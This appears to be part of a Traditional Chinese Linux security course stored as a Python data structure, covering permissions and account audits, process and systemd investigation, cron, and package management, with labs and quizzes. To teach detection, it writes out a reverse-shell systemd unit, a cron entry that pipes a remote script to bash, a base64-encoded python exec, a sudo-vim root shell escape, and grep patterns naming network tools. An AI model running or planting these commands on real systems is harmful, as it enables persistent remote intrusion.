<text x="190" y="236" text-anchor="middle" fill="#64748b" font-size="11">讀 4 + 寫 2</text>
<line x1="288" y1="112" x2="288" y2="242" stroke="#fbbf24"/><text x="288" y="260" text-anchor="middle" fill="#fbbf24" font-size="13" font-weight="700">群組 = 4</text>
<text x="288" y="278" text-anchor="middle" fill="#64748b" font-size="11">只能讀</text>
<line x1="392" y1="112" x2="392" y2="284" stroke="#f87171"/><text x="392" y="302" text-anchor="middle" fill="#f87171" font-size="13" font-weight="700">其他人 = 0（完全沒權限）</text>
<rect x="480" y="60" width="180" height="120" rx="8" fill="#0f2233" stroke="#334155"/>
<text x="570" y="84" text-anchor="middle" fill="#7dd3fc" font-size="12" font-weight="700">常用數字</text>
<text x="496" y="106" fill="#94a3b8" font-size="12">755 程式 / 目錄</text>
<text x="496" y="126" fill="#94a3b8" font-size="12">644 一般文件</text>
<text x="496" y="146" fill="#94a3b8" font-size="12">640 設定檔</text>
<text x="496" y="166" fill="#4ade80" font-size="12">600 SSH 私鑰</text>
</svg>""",
    "labs": [{
        "title": "權限與帳號稽核實作",
        "goal": "跑一遍帳號覆核與權限檢查，找出真實環境常見的錯誤設定。",
        "warn": "查詢類指令安全。修改權限與帳號請在測試機執行。",
        "steps": [
            {"cmd": "ls -l /etc/shadow /etc/passwd ~/.ssh/id_rsa",
             "explain": "確認關鍵檔案權限。shadow 不能被其他人讀、私鑰必須是 600。",
             "output": "-rw-r--r-- 1 root root   2181 May 12 09:02 /etc/passwd\n-rw-r----- 1 root shadow 1284 May 12 09:02 /etc/shadow\n-rw-r--r-- 1 tom  tom    2602 Apr 30 14:12 /home/tom/.ssh/id_rsa\n# 警訊：私鑰是 644（其他人可讀）→ SSH 會拒絕使用，且金鑰已算洩漏風險"},
            {"cmd": "chmod 700 ~/.ssh && chmod 600 ~/.ssh/id_rsa && ls -ld ~/.ssh ~/.ssh/id_rsa",
             "explain": "修正私鑰權限。這是每個人第一次用 SSH 金鑰都會遇到的問題。",
             "output": "drwx------ 2 tom tom 4096 Apr 30 14:12 /home/tom/.ssh\n-rw------- 1 tom tom 2602 Apr 30 14:12 /home/tom/.ssh/id_rsa"},
            {"cmd": "awk -F: '$7 !~ /(nologin|false)$/ {print $1, $3, $7}' /etc/passwd",
             "explain": "**帳號稽核第一步**：列出所有「能登入」的帳號。系統帳號應該都是 nologin。",
             "output": "root 0 /bin/bash\ntom 1000 /bin/bash\ndeploy 1001 /bin/bash\nbackupsvc 0 /bin/bash\n# 兩個問題：backupsvc 的 UID 是 0（後門）、服務帳號 deploy 有互動式 shell"},
            {"cmd": "sudo awk -F: '$2==\"\" {print $1 \" 沒有設定密碼\"}' /etc/shadow",
             "explain": "找出沒有密碼的帳號 — 任何人打帳號就能登入，極度危險。",
             "output": "guest 沒有設定密碼\n# 立即處理：sudo passwd -l guest 或直接刪除該帳號"},
            {"cmd": "sudo chage -l tom",
             "explain": "看單一帳號的密碼政策：上次改密碼時間、多久要換、何時到期。",
             "output": "Last password change                    : Jan 03, 2024\nPassword expires                        : never\nPassword inactive                       : never\nAccount expires                         : never\nMinimum number of days between password change : 0\nMaximum number of days between password change : 99999\nNumber of days of warning before password expires : 7\n# 密碼從未過期且超過一年未更換 → 不符多數企業政策"},
            {"cmd": "getent group sudo wheel adm",
             "explain": "看誰擁有提權能力。這份名單應該極短，且每季覆核。",
             "output": "sudo:x:27:tom,deploy,intern\nadm:x:4:syslog,tom\n# 警訊：intern（實習生）在 sudo 群組裡 → 違反最小權限"},
            {"cmd": "sudo grep -vE '^#|^$' /etc/sudoers /etc/sudoers.d/* 2>/dev/null",
             "explain": "檢查 sudo 設定。重點找 NOPASSWD、萬用字元、可跳脫的程式。",
             "output": "/etc/sudoers:Defaults        env_reset\n/etc/sudoers:Defaults        secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\n/etc/sudoers:root    ALL=(ALL:ALL) ALL\n/etc/sudoers:%sudo   ALL=(ALL:ALL) ALL\n/etc/sudoers.d/deploy:deploy ALL=(root) NOPASSWD: /usr/bin/vim /etc/nginx/nginx.conf\n# 重大問題：允許 sudo vim → 在 vim 中執行 :!/bin/sh 即可取得 root shell\n# 正解：改用 sudoedit 或限定 systemctl reload nginx"},
            {"cmd": "lastlog -b 90",
             "explain": "找出 90 天未登入的帳號 — 通常是離職未清理的孤兒帳號。",
             "output": "Username         Port     From             Latest\nguest                                     **Never logged in**\nolduser          pts/2    10.10.10.99     Wed Jan 10 09:14:02 +0800 2024\nbackupsvc                                 **Never logged in**\n# 三個候選：確認後應鎖定（passwd -l）而非直接刪除，以保留檔案歸屬供調查"},
            {"cmd": "getfacl /shared/report.xlsx",
             "explain": "當 ls -l 顯示 `+` 時，代表有 ACL，必須用 getfacl 才看得到完整權限。",
             "output": "# file: shared/report.xlsx\n# owner: alice\n# group: finance\nuser::rw-\nuser:bob:rw-\ngroup::r--\ngroup:audit:r--\nmask::rw-\nother::---\n# 傳統 ls -l 只會顯示 -rw-rw----+ ，看不到 bob 與 audit 的個別授權"},
        ],
    }],
    "quiz": [
        {"q": "`-rw-r-----` 對應的數字權限是？",
         "options": ["644", "640", "600", "740"],
         "answer": 1,
         "why": "rw- = 4+2 = 6，r-- = 4，--- = 0 → 640。"},
        {"q": "SSH 私鑰檔案的正確權限應該是？",
         "options": ["644", "600", "755", "777"],
         "answer": 1,
         "why": "600（只有擁有者可讀寫）。SSH 會主動拒絕使用權限過寬的私鑰，這是安全預設的好例子。"},
        {"q": "目錄權限中的 `x` 代表什麼？",
         "options": ["可以執行目錄裡的程式", "可以 cd 進入該目錄並存取裡面的檔案",
                     "可以刪除目錄", "可以列出檔名"],
         "answer": 1,
         "why": "目錄的 r = 可列出檔名、w = 可新增刪除檔案、x = 可進入與存取內容。"
                "只有 r 沒有 x 時，看得到檔名但打不開。"},
        {"q": "`umask 027` 會讓新建立的檔案與目錄權限變成？",
         "options": ["檔案 644、目錄 755", "檔案 640、目錄 750",
                     "檔案 600、目錄 700", "檔案 666、目錄 777"],
         "answer": 1,
         "why": "檔案基底 666−027=640、目錄基底 777−027=750。其他人完全沒有權限，比預設 022 更安全。"},
        {"q": "為什麼 `sudo vim /etc/nginx/nginx.conf` 是危險的 sudoers 設定？",
         "options": ["vim 太耗資源", "vim 內可執行 :!/bin/sh，直接取得 root shell，等於給了完整權限",
                     "vim 不支援大檔案", "會破壞檔案編碼"],
         "answer": 1,
         "why": "任何能「跳出去執行其他程式」的工具都不該用 sudo 授權。應改用 sudoedit "
                "或只授權 systemctl reload。這類清單可在 GTFOBins 查到。"},
        {"q": "`/tmp` 目錄的 sticky bit（權限 1777）作用是？",
         "options": ["禁止執行檔案", "所有人都能寫入，但只有檔案擁有者能刪除自己的檔案",
                     "自動清空目錄", "限制檔案大小"],
         "answer": 1,
         "why": "沒有 sticky bit 的話，任何人都能刪別人的暫存檔。"
                "但注意它不阻止執行 — 加固要另外掛載 noexec。"},
        {"q": "在 /etc/shadow 中，密碼欄位開頭是 `!` 代表什麼？",
         "options": ["密碼很強", "帳號已被鎖定，無法用密碼登入", "密碼已過期", "使用 MD5 雜湊"],
         "answer": 1,
         "why": "`!` 或 `*` 表示鎖定 / 無法用密碼認證。`passwd -l` 就是在雜湊前面加上 `!`。"},
        {"q": "`ls -l` 顯示 `-rw-rw----+`，最後那個 `+` 代表什麼？",
         "options": ["檔案已加密", "檔案有額外的 ACL 設定，需用 getfacl 查看完整權限",
                     "檔案是符號連結", "檔案有 SUID"],
         "answer": 1,
         "why": "`+` 表示存在 POSIX ACL。傳統三組 rwx 看不到針對個別使用者/群組的授權。"},
        {"q": "程式明明有足夠的檔案權限卻仍被拒絕存取，最該先檢查什麼？",
         "options": ["重開機", "SELinux / AppArmor 是否在阻擋（用 getenforce 與 ausearch 檢查）",
                     "直接 chmod 777", "更換硬碟"],
         "answer": 1,
         "why": "SELinux/AppArmor 是 MAC，疊在 DAC 之上。"
                "**不要為了讓程式跑就關掉 SELinux** — 應新增正確的 policy。"},
    ],
    "keywords": ["權限", "rwx", "chmod", "chown", "umask", "SUID", "SGID", "Sticky Bit",
                 "sudo", "sudoers", "/etc/passwd", "/etc/shadow", "ACL", "setfacl",
                 "SELinux", "AppArmor", "GTFOBins"],
    "takeaway": [
        "rwx 對應 4/2/1；640 = 設定檔、600 = 私鑰、755 = 程式，這幾個要背。",
        "SUID 是最主要的本機提權途徑，必須建立基準清單並定期比對。",
        "sudoers 要用白名單，且絕不授權能跳脫成 shell 的程式（vim、python、find…）。",
    ],
})

CH.append({
    "id": "l03",
    "title": "程序、服務與 systemd",
    "subtitle": "程序管理、systemd 單元、開機自啟、找出可疑程序",
    "level": "進階",
    "minutes": 22,
    "summary": "惡意程式最終一定會變成一個「正在執行的程序」。看得懂程序清單，你就能抓到它。",
    "why": "程序就像**公司裡正在做事的員工**。你要知道：有幾個人在上班、"
           "誰是誰的下屬、誰在用最多資源、**有沒有陌生人混進來**。"
           "而 systemd 是人事部門 — 它決定開機後誰要來上班。",
    "sections": [
        {
            "heading": "看懂程序清單",
            "body": "**核心概念**：\n"
                    "- **PID**：程序編號。PID 1 是 `systemd`（所有程序的祖先）。\n"
                    "- **PPID**：父程序編號。**入侵調查時，父子關係比程序本身更重要。**\n"
                    "- **狀態**：`R` 執行中、`S` 睡眠、`D` 不可中斷、`Z` 殭屍、`T` 停止\n\n"
                    "**常用指令**：\n"
                    "```\n"
                    "ps aux                  # 所有程序（BSD 風格，最常用）\n"
                    "ps -ef                  # 所有程序（System V 風格，有 PPID）\n"
                    "ps auxf                 # 樹狀顯示父子關係\n"
                    "pstree -p               # 更清楚的樹狀圖\n"
                    "top / htop              # 即時監控\n"
                    "pgrep -a nginx          # 依名稱找 PID\n"
                    "kill -15 <PID>          # 溫和終止（SIGTERM，讓程式自己收尾）\n"
                    "kill -9 <PID>           # 強制殺掉（SIGKILL，最後手段）\n"
                    "```\n\n"
                    "**`ps aux` 的欄位**：\n"
                    "`USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND`\n"
                    "資安上最重要的是 **USER**（誰在跑）與 **COMMAND**（跑什麼）。",
            "example": "**父子關係為什麼是關鍵**：\n\n"
                       "正常情況：\n"
                       "```\n"
                       "systemd(1) ─ nginx(812) ─ nginx worker(813)\n"
                       "```\n"
                       "**異常情況（幾乎確定被入侵）**：\n"
                       "```\n"
                       "systemd(1) ─ nginx(812) ─ sh(4471) ─ curl(4472)\n"
                       "```\n"
                       "**網頁伺服器不應該生出 shell。** 這代表：\n"
                       "1. 網站有遠端命令執行漏洞（RCE）\n"
                       "2. 攻擊者透過它執行了 `sh`\n"
                       "3. 正在用 `curl` 下載後續工具\n\n"
                       "**其他必須警覺的父子組合**：\n"
                       "- `winword.exe → powershell.exe`（Windows：巨集攻擊）\n"
                       "- `mysqld → bash`（資料庫被利用）\n"
                       "- `sshd → 非預期的程序`\n"
                       "- 任何服務帳號 → 網路工具（curl、wget、nc）\n\n"
                       "**這就是 EDR 的核心偵測邏輯：看行為鏈，不是看檔案雜湊。**",
            "note": "考點：`kill` 預設送 SIGTERM(15)，程式可以攔截並優雅結束。"
                    "SIGKILL(9) 無法被攔截但可能留下不一致的狀態，應為最後手段。"
                    "`SIGHUP(1)` 常被服務用來「重新載入設定而不中斷」。",
        },
        {
            "heading": "找出可疑程序：六個檢查點",
            "body": "**1. 誰在監聽網路？**\n"
                    "```\n"
                    "ss -tulnp\n"
                    "```\n"
                    "每個監聽的 port 都要對得上一個已知服務。\n\n"
                    "**2. 誰在對外連線？**\n"
                    "```\n"
                    "ss -tnp state established\n"
                    "```\n"
                    "陌生 IP、奇怪 port（4444、1337、9001）都要查。\n\n"
                    "**3. 有沒有程序的執行檔已被刪除？**（惡意程式常見手法）\n"
                    "```\n"
                    "ls -l /proc/*/exe 2>/dev/null | grep deleted\n"
                    "```\n"
                    "**這是最強的單一偵測指標之一** — 正常程式不會刪掉自己。\n\n"
                    "**4. CPU 佔用異常高的是誰？**（挖礦程式的特徵）\n"
                    "```\n"
                    "ps aux --sort=-%cpu | head -10\n"
                    "```\n\n"
                    "**5. 程序的實際執行路徑是什麼？**（名稱可以偽裝，路徑不會）\n"
                    "```\n"
                    "ls -l /proc/<PID>/exe\n"
                    "cat /proc/<PID>/cmdline | tr '\\0' ' '\n"
                    "ls -l /proc/<PID>/cwd\n"
                    "```\n\n"
                    "**6. 這個程序打開了哪些檔案？**\n"
                    "```\n"
                    "sudo lsof -p <PID>\n"
                    "```",
            "example": "**完整調查一個可疑程序的流程**：\n"
                       "```\n"
                       "# 發現 CPU 100% 的可疑程序\n"
                       "$ ps aux --sort=-%cpu | head -3\n"
                       "USER     PID %CPU %MEM COMMAND\n"
                       "www-data 4471 98.7  1.2 [kworker/0:2]\n"
                       "\n"
                       "# 看起來像核心執行緒，但核心執行緒不會屬於 www-data！\n"
                       "# 檢查真實執行檔路徑\n"
                       "$ sudo ls -l /proc/4471/exe\n"
                       "lrwxrwxrwx 1 www-data www-data 0 May 12 10:41 /proc/4471/exe -> /tmp/.kdevtmpfsi\n"
                       "\n"
                       "# 確認：它假裝成核心執行緒，實際在 /tmp 執行\n"
                       "# 看完整指令列\n"
                       "$ sudo cat /proc/4471/cmdline | tr '\\0' ' '\n"
                       "[kworker/0:2] \n"
                       "\n"
                       "# 看它連去哪裡\n"
                       "$ sudo ss -tnp | grep 4471\n"
                       "ESTAB 0 0 10.10.10.5:51501 185.220.101.44:9001 users:((\"kdevtmpfsi\",pid=4471))\n"
                       "```\n"
                       "**結論**：偽裝成核心執行緒的挖礦程式，"
                       "由被入侵的網站服務（www-data）啟動，正連往礦池。\n\n"
                       "**處置順序**：先保存證據（記下 PID、路徑、連線、"
                       "複製檔案做雜湊）→ 再隔離主機 → 才殺程序。"
                       "**先殺程序會摧毀證據。**",
            "note": "偽裝技巧：惡意程式常用中括號名稱（模仿核心執行緒）、"
                    "或改成 `sshd`、`systemd-worker` 等看起來正常的名字。"
                    "**判斷依據永遠是「執行檔的實際路徑」與「執行身分」，不是名稱。**",
        },
        {
            "heading": "systemd：現代 Linux 的服務管理",
            "body": "**基本操作（必背）**：\n"
                    "```\n"
                    "systemctl status nginx        # 看狀態（含最近日誌）\n"
                    "systemctl start / stop nginx  # 啟動 / 停止\n"
                    "systemctl restart nginx       # 重啟\n"
                    "systemctl reload nginx        # 只重新載入設定，不中斷服務\n"
                    "systemctl enable nginx        # 開機自動啟動\n"
                    "systemctl disable nginx       # 取消開機啟動\n"
                    "systemctl mask nginx          # 完全禁止啟動（比 disable 更強）\n"
                    "systemctl list-units --type=service --state=running\n"
                    "systemctl list-unit-files --state=enabled\n"
                    "```\n\n"
                    "**`enable` 與 `start` 的差別（考試常考）**：\n"
                    "- `start` = **現在**啟動，重開機後不會自己起來\n"
                    "- `enable` = **開機時**啟動，但現在不會馬上起來\n"
                    "- 兩個都要 → `systemctl enable --now nginx`\n\n"
                    "**單元檔位置**：\n"
                    "- `/lib/systemd/system/` — 套件安裝的（**不要直接改**）\n"
                    "- `/etc/systemd/system/` — 管理員自訂的（**優先度更高**）\n"
                    "改完要 `systemctl daemon-reload`。",
            "example": "**resistance：攻擊者用 systemd 做持續駐留**\n\n"
                       "入侵後最常見的持續化手法之一，就是建立一個惡意 service：\n"
                       "```\n"
                       "# /etc/systemd/system/system-update.service   ← 名字取得像系統服務\n"
                       "[Unit]\n"
                       "Description=System Update Helper\n"
                       "\n"
                       "[Service]\n"
                       "Type=simple\n"
                       "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.44/4444 0>&1'\n"
                       "Restart=always\n"
                       "RestartSec=60\n"
                       "\n"
                       "[Install]\n"
                       "WantedBy=multi-user.target\n"
                       "```\n"
                       "**這個服務每 60 秒就嘗試連回攻擊者，重開機也會自動恢復。**\n\n"
                       "**偵測方式**：\n"
                       "```\n"
                       "# 1. 找出最近建立/修改的單元檔\n"
                       "find /etc/systemd/system /lib/systemd/system -mtime -7 -type f\n\n"
                       "# 2. 列出所有 enabled 的服務，與基準清單比對\n"
                       "systemctl list-unit-files --state=enabled\n\n"
                       "# 3. 檢查所有 ExecStart 有沒有可疑內容\n"
                       "grep -rE 'ExecStart.*(bash|sh|nc|curl|wget|/dev/tcp)' /etc/systemd/system/\n"
                       "```\n\n"
                       "**其他常見的持續化位置（一定要一起查）**：\n"
                       "`crontab -l`、`/etc/cron*`、`/etc/rc.local`、"
                       "`~/.bashrc`、`~/.profile`、`/etc/profile.d/`、"
                       "`~/.ssh/authorized_keys`、systemd timer、"
                       "以及 `/etc/ld.so.preload`（LD_PRELOAD rootkit）。",
            "note": "systemd 也可以用來**加固**服務。在單元檔加上"
                    "`ProtectSystem=strict`、`PrivateTmp=yes`、`NoNewPrivileges=yes`、"
                    "`ReadOnlyPaths=`、`CapabilityBoundingSet=` 等選項，"
                    "可以大幅限制服務被入侵後能做的事 — 這是免費的沙箱化。",
        },
        {
            "heading": "排程任務：cron 與 systemd timer",
            "body": "**cron 格式（五個欄位）**：\n"
                    "```\n"
                    "分  時  日  月  週   指令\n"
                    "*   *   *   *   *    /path/to/script.sh\n"
                    "│   │   │   │   └── 星期 0-7（0 和 7 都是週日）\n"
                    "│   │   │   └────── 月 1-12\n"
                    "│   │   └────────── 日 1-31\n"
                    "│   └────────────── 時 0-23\n"
                    "└────────────────── 分 0-59\n"
                    "```\n"
                    "範例：\n"
                    "- `0 3 * * *` 每天凌晨三點\n"
                    "- `*/5 * * * *` 每五分鐘\n"
                    "- `0 2 * * 0` 每週日凌晨兩點\n\n"
                    "**cron 的多個位置（調查時全部要看）**：\n"
                    "```\n"
                    "crontab -l                    # 目前使用者的\n"
                    "sudo crontab -l -u www-data    # 指定使用者的（服務帳號最可疑）\n"
                    "ls -la /var/spool/cron/crontabs/   # 所有使用者的\n"
                    "cat /etc/crontab                    # 系統層級\n"
                    "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/\n"
                    "systemctl list-timers --all         # systemd timer\n"
                    "```",
            "example": "**惡意 cron 的典型樣態**：\n"
                       "```\n"
                       "$ sudo crontab -l -u www-data\n"
                       "*/10 * * * * curl -s http://185.220.101.44/x.sh | bash\n"
                       "```\n"
                       "**每十分鐘從外部下載腳本並執行** — "
                       "這樣攻擊者可以隨時更換 payload，而且清掉惡意檔案也沒用，"
                       "十分鐘後又會回來。\n\n"
                       "**更隱蔽的變體**：\n"
                       "```\n"
                       "# 藏在正常項目中間，並用 base64 編碼\n"
                       "0 4 * * * /usr/bin/env python3 -c \"import base64;exec(base64.b64decode('aW1wb3J0...'))\"\n"
                       "```\n\n"
                       "**偵測與防禦**：\n"
                       "1. 設定基準：正常環境應該有哪些 cron？多出來的就告警\n"
                       "2. 監控 `/var/spool/cron/` 與 `/etc/cron*` 的檔案變更（用 auditd）\n"
                       "3. **服務帳號（www-data、nobody）不應該有任何 cron** — "
                       "有就是紅旗\n"
                       "4. 用 `/etc/cron.allow` 白名單限制誰能建立 cron",
            "note": "考點：`crontab -e` 編輯自己的、`crontab -l` 列出、`crontab -r` **刪除全部**（危險）。"
                    "cron 的環境變數很少，所以腳本裡**必須用絕對路徑**，"
                    "這也是「明明手動跑得起來，放 cron 就失敗」的最常見原因。",
        },
    ],
    "labs": [{
        "title": "抓出可疑程序與持續化後門",
        "goal": "走完一次完整的「程序與持續化」檢查流程。",
        "warn": "全部是查詢指令，安全。kill 指令請確認 PID 後再執行。",
        "steps": [
            {"cmd": "ps auxf | head -20",
             "explain": "**樹狀顯示程序**。重點看父子關係有沒有不合理的組合。",
             "output": "USER     PID %CPU %MEM  COMMAND\nroot       1  0.0  0.4 /sbin/init\nroot     744  0.0  0.2 /usr/sbin/sshd -D\nroot    2201  0.0  0.3  \\_ sshd: tom [priv]\ntom     2233  0.0  0.1      \\_ sshd: tom@pts/0\ntom     2234  0.0  0.1          \\_ -bash\nroot     812  0.0  0.3 nginx: master process /usr/sbin/nginx\nwww-data 813  0.1  0.5  \\_ nginx: worker process\nwww-data 4471 98.7  1.2  \\_ sh -c curl -s http://185.220.101.44/x.sh | bash\nwww-data 4472 12.1  0.8      \\_ [kworker/0:2]\n# 重大警訊：nginx worker 生出 sh 與 curl → 網站遭 RCE 攻擊"},
            {"cmd": "sudo ls -l /proc/4472/exe",
             "explain": "**看程序的真實執行檔路徑**。程序名稱可以偽裝，這個不行。",
             "output": "lrwxrwxrwx 1 www-data www-data 0 May 12 10:41 /proc/4472/exe -> /tmp/.kdevtmpfsi\n# 假裝成核心執行緒 [kworker]，實際跑的是 /tmp 底下的隱藏檔"},
            {"cmd": "sudo ls -l /proc/*/exe 2>/dev/null | grep deleted",
             "explain": "**最強的單一偵測指標**：執行檔已被刪除但程序還在跑。"
                        "正常程式不會刪掉自己。",
             "output": "lrwxrwxrwx 1 www-data www-data 0 May 12 10:44 /proc/4488/exe -> '/tmp/.sysd (deleted)'\n# 惡意程式的經典手法：執行後刪除自己，避免被檔案掃描發現"},
            {"cmd": "sudo ss -tnp state established",
             "explain": "看所有已建立的對外連線，找陌生 IP 與可疑 port（4444、1337、9001）。",
             "output": "Recv-Q Send-Q Local Address:Port      Peer Address:Port  Process\n0      0      10.10.10.5:22          10.10.99.7:52201   users:((\"sshd\",pid=2201))\n0      0      10.10.10.5:51422       93.184.216.34:443  users:((\"nginx\",pid=813))\n0      0      10.10.10.5:51501       185.220.101.44:9001 users:((\"kdevtmpfsi\",pid=4472))\n0      0      10.10.10.5:51533       185.220.101.44:4444 users:((\".sysd\",pid=4488))\n# 兩條連往同一個外部 IP 的可疑連線 → 4444 是反向 shell 常用 port"},
            {"cmd": "grep -rE 'ExecStart.*(bash|/dev/tcp|nc |curl|wget)' /etc/systemd/system/ 2>/dev/null",
             "explain": "**檢查 systemd 持續化後門**。正常服務的 ExecStart 不會直接呼叫 shell 或網路工具。",
             "output": "/etc/systemd/system/system-update.service:ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.44/4444 0>&1'\n# 確認找到持續化後門：偽裝成系統更新服務的反向 shell"},
            {"cmd": "find /etc/systemd/system /lib/systemd/system -mtime -7 -type f 2>/dev/null",
             "explain": "找出最近七天新增或修改的服務單元檔。",
             "output": "/etc/systemd/system/system-update.service\n/etc/systemd/system/multi-user.target.wants/system-update.service\n# 兩個檔案都是新建的（含 enable 用的符號連結）"},
            {"cmd": "for u in root www-data nobody deploy; do echo \"--- $u ---\"; sudo crontab -l -u $u 2>/dev/null; done",
             "explain": "**逐一檢查每個帳號的 cron**。服務帳號（www-data、nobody）有 cron 就是紅旗。",
             "output": "--- root ---\n0 3 * * * /usr/local/bin/backup.sh\n--- www-data ---\n*/10 * * * * curl -s http://185.220.101.44/x.sh | bash\n--- nobody ---\n--- deploy ---\n0 2 * * * /home/deploy/deploy.sh\n# www-data 的 cron 每十分鐘從外部下載並執行腳本 → 持續化機制"},
            {"cmd": "systemctl list-timers --all | head -8",
             "explain": "systemd timer 是 cron 的現代替代品，也可以被用來持續化，不能只查 cron。",
             "output": "NEXT                        LEFT     LAST                        PASSED   UNIT                    ACTIVATES\nMon 2026-07-30 06:12:00 UTC 42min    Mon 2026-07-30 05:12:00 UTC 17min    apt-daily.timer         apt-daily.service\nMon 2026-07-30 07:00:00 UTC 1h 30min Mon 2026-07-30 06:00:00 UTC 5min     logrotate.timer         logrotate.service\nMon 2026-07-30 05:35:00 UTC 5min     Mon 2026-07-30 05:30:00 UTC 0min     .cache-update.timer     .cache-update.service\n# 第三個：以 . 開頭的隱藏名稱 timer，每 5 分鐘執行 → 需立即調查"},
            {"cmd": "ps aux --sort=-%cpu | head -5",
             "explain": "CPU 排行。持續 90% 以上且是服務帳號在跑，通常是挖礦。",
             "output": "USER      PID %CPU %MEM    VSZ   RSS COMMAND\nwww-data 4472 98.7  1.2 892104 48920 [kworker/0:2]\nwww-data 4488 45.2  0.8 412008 32104 .sysd\nroot      812  0.1  0.3  55240 12408 nginx: master process\nroot      744  0.0  0.2  15852  9204 /usr/sbin/sshd -D\nroot        1  0.0  0.4 168404 13288 /sbin/init"},
        ],
    }],
    "quiz": [
        {"q": "在程序樹中看到 `nginx worker → sh → curl`，這代表什麼？",
         "options": ["正常的網站運作", "網頁服務可能存在遠端命令執行漏洞，攻擊者正在下載後續工具",
                     "系統正在更新", "設定檔錯誤"],
         "answer": 1,
         "why": "網頁伺服器不應該生出 shell。這個父子鏈是 RCE 的典型指標，"
                "也是 EDR 的核心偵測邏輯 — 看行為鏈而非檔案雜湊。"},
        {"q": "`ls -l /proc/*/exe | grep deleted` 在找什麼？為什麼重要？",
         "options": ["找出已刪除的日誌", "找出執行檔已被刪除但程序仍在執行的情況；正常程式不會刪掉自己",
                     "找出磁碟錯誤", "找出殭屍程序"],
         "answer": 1,
         "why": "惡意程式的經典手法：執行後刪除自身以躲避檔案掃描。這是最強的單一偵測指標之一。"},
        {"q": "`systemctl start nginx` 與 `systemctl enable nginx` 的差別？",
         "options": ["完全相同", "start 是現在啟動（重開機不會自動起）；enable 是設定開機自動啟動（現在不會起）",
                     "enable 比較快", "start 需要 root，enable 不需要"],
         "answer": 1,
         "why": "兩者都要就用 `systemctl enable --now nginx`。這是考試高頻題。"},
        {"q": "一個程序名稱顯示為 `[kworker/0:2]`（看起來像核心執行緒），但屬於 www-data。這說明什麼？",
         "options": ["正常現象", "核心執行緒必定屬於 root，這是惡意程式在偽裝名稱",
                     "系統負載過高", "需要更新核心"],
         "answer": 1,
         "why": "核心執行緒一律由 root 擁有。判斷依據應是 /proc/PID/exe 的實際路徑與執行身分，"
                "不是程序名稱。"},
        {"q": "發現可疑程序後，正確的處理順序是？",
         "options": ["立刻 kill -9 停止危害", "先保存證據（PID、路徑、連線、檔案雜湊）→ 隔離主機 → 再處置程序",
                     "先重開機", "先刪除檔案"],
         "answer": 1,
         "why": "先殺程序會摧毀記憶體中的證據，也讓你無法確認攻擊範圍。"
                "隔離（斷網）能停止危害同時保留現場。"},
        {"q": "cron 表達式 `*/5 * * * *` 代表什麼？",
         "options": ["每天五點", "每五分鐘", "每月五號", "每週五"],
         "answer": 1,
         "why": "第一欄是分鐘，*/5 表示每 5 分鐘。惡意 cron 常用短間隔以確保持續化。"},
        {"q": "服務帳號 www-data 有一個 crontab 項目。這應該如何看待？",
         "options": ["正常，服務需要定期任務", "紅旗：服務帳號通常不需要 cron，極可能是入侵後的持續化機制",
                     "無關資安", "代表服務設定正確"],
         "answer": 1,
         "why": "應建立基準：哪些帳號應該有 cron。服務帳號的 cron 幾乎總是可疑。"},
        {"q": "調查持續化後門時，除了 cron 與 systemd service，還必須檢查哪些位置？",
         "options": ["只需查 cron 就夠", "systemd timer、/etc/rc.local、~/.bashrc、/etc/profile.d/、"
                     "~/.ssh/authorized_keys、/etc/ld.so.preload",
                     "只需查 /tmp", "只需重裝系統"],
         "answer": 1,
         "why": "持續化位置很多。只清掉一處，攻擊者可從另一處回來。"
                "應有一份完整的持續化檢查清單。"},
        {"q": "在 systemd 單元檔中加入 `ProtectSystem=strict`、`PrivateTmp=yes`、`NoNewPrivileges=yes` 的目的是？",
         "options": ["加快啟動速度", "限制服務被入侵後能做的事，等於免費的沙箱化加固",
                     "節省記憶體", "啟用日誌"],
         "answer": 1,
         "why": "systemd 內建的沙箱選項可大幅縮小服務的權限範圍，"
                "是零成本的深度防禦措施，但很少被使用。"},
    ],
    "keywords": ["程序", "PID", "PPID", "ps", "pstree", "kill", "signal", "systemd",
                 "systemctl", "unit", "enable", "cron", "crontab", "systemd timer",
                 "持續化", "反向 shell", "lsof", "/proc"],
    "takeaway": [
        "程序的父子關係比程序本身更有偵測價值 — 服務不該生出 shell。",
        "程序名稱可以偽裝，/proc/PID/exe 的實際路徑不會。",
        "持續化位置不只 cron：systemd service/timer、rc.local、shell 設定檔、authorized_keys 都要查。",
    ],
})

CH.append({
    "id": "l04",
    "title": "套件管理、修補與系統加固",
    "subtitle": "apt/yum、修補管理、CIS Benchmark、最小化安裝",
    "level": "進階",
    "minutes": 24,
    "summary": "未修補的已知漏洞是入侵的第一大原因。修補管理不是技術問題，是流程問題。",
    "why": "把系統想成一棟房子。**修補程式就是修補牆上的破洞**。"
           "問題是：破洞每週都有新的、修補時房子要暫停使用、有些修補會弄壞其他東西。"
           "所以修補管理的難處**從來不是「怎麼修」，而是「怎麼在不停業的情況下持續修」**。",
    "sections": [
        {
            "heading": "套件管理基本操作",
            "body": "**Debian / Ubuntu（apt）**：\n"
                    "```\n"
                    "sudo apt update                    # 更新套件清單（不會裝東西）\n"
                    "sudo apt upgrade                   # 升級已安裝的套件\n"
                    "sudo apt full-upgrade              # 允許移除套件的升級\n"
                    "apt list --upgradable              # 看有哪些可升級\n"
                    "sudo apt install nginx             # 安裝\n"
                    "sudo apt remove --purge nginx      # 移除含設定檔\n"
                    "sudo apt autoremove                # 清掉不再需要的依賴\n"
                    "apt-cache policy nginx             # 看版本與來源\n"
                    "dpkg -l | grep nginx               # 列出已安裝\n"
                    "dpkg -S /usr/sbin/nginx            # 這個檔案屬於哪個套件\n"
                    "```\n\n"
                    "**RHEL / CentOS / Rocky（dnf / yum）**：\n"
                    "```\n"
                    "sudo dnf check-update              # 檢查更新\n"
                    "sudo dnf update                    # 全部更新\n"
                    "sudo dnf update --security          # 只裝安全性更新\n"
                    "sudo dnf install nginx\n"
                    "rpm -qa | grep nginx               # 列出已安裝\n"
                    "rpm -qf /usr/sbin/nginx            # 反查所屬套件\n"
                    "rpm -V nginx                       # 驗證檔案是否被篡改\n"
                    "```\n\n"
                    "**`rpm -V` 與 `debsums` 是重要的完整性檢查工具** — "
                    "它們比對已安裝檔案與套件原始雜湊，可以發現「系統程式被替換」的 rootkit。",
